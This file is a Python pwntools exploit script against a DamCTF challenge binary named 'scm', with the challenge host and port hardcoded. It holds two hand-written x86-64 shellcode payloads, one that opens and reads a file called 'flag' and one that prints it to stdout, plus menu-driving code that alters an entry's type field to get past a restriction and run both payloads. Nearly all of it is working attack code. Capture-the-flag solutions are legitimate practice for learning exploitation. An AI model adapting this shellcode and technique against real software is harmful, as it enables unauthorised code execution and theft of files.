#!/usr/bin/env python

import os
import sys

from pwn import *

HOST = "chals.damctf.xyz"
PORT = 30200

BINARY_PATH = "../scm"
LIBC_PATH = "./libc.so.6"

elf = ELF(BINARY_PATH)
context.binary = elf
context.arch = elf.arch
rop = ROP(elf)

if os.path.exists(LIBC_PATH):
    log.debug("loading chal libc")
    libc = ELF(LIBC_PATH)
else:
    log.debug("loading system libc")
    libc = ELF("/usr/lib/libc.so.6")

# p: pwnlib.tubes.tube

def get_cxn():
    if "remote" in sys.argv:
        return remote(HOST, PORT)

    tmp_path=BINARY_PATH
    # pwninit --no-template --bin testbin --libc libc.so.6
    if os.path.exists(BINARY_PATH+"_patched"):
        tmp_path += "_patched"

    p = process(tmp_path)

    if "debug" in sys.argv:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
            # GDB commands here
            "set follow-fork-mode child",
            "break scm.c:68",
            "break scm.c:159"
        ]))

    return p

shellcode_1 = asm(r"""
    // open the file
    xor %rdx, %rdx
    push %rdx
    push 0x67616c66
    mov %rdi, %rsp
    mov %rsi, %rdx
    mov %rax, %rdx
    push 0x2
    pop %rax
    syscall
    
    // save the fd
    mov %rdi, %rax

    // get the buf location
    call $+5
    pop %rbx
    and %bx, 0xf000
    add %rbx, 0x800

    // read in the flag
    mov %rsi, %rbx
    push 0x80
    pop %rdx
    xor %rax, %rax
    syscall

    // exit
    push 0xe7
    pop %rax
    xor %rdi, %rdi
    syscall
""")

shellcode_2 = asm(r"""
    // get the flag location
    call $+5
    pop %rbx
    and %bx, 0xf000
    add %rbx, 0x1800

    // write to stdout
    xor %rax, %rax
    inc %rax
    mov %rdi, %rax
    mov %rsi, %rbx
    push 0x80
    pop %rdx
    syscall

    // exit
    push 0xe7
    pop %rax
    xor %rdi, %rdi
    syscall
""")

def new_sc(t, sc):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b": ", str(t).encode())
    p.sendlineafter(b": ", str(len(sc)).encode())
    p.sendlineafter(b": ", sc)

def exec_sc(idx):
    p.sendlineafter(b"Choice: ", b"3")
    p.sendlineafter(b": ", str(idx).encode())

def edit_sc(idx, new_type=None, new_sc=None):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b": ", str(idx).encode())

    if new_type is not None:
        p.sendlineafter(b": ", b"y")
        p.sendlineafter(b": ", str(new_type).encode())
    else:
        p.sendlineafter(b": ", b"n")

    if new_sc is not None:
        p.sendlineafter(b": ", b"y")
        p.sendlineafter(b": ", str(len(new_sc)).encode())
        p.sendlineafter(b": ", new_sc)
    else:
        p.sendlineafter(b": ", b"n")

def pwn():
    global p
    p = get_cxn()

    new_sc(1, shellcode_1)
    new_sc(3, shellcode_2)
    edit_sc(0, new_type=0x101)
    exec_sc(0)
    exec_sc(1)

    print(p.recvall(timeout=1))
    # p.interactive()

if __name__ == "__main__":
    pwn()
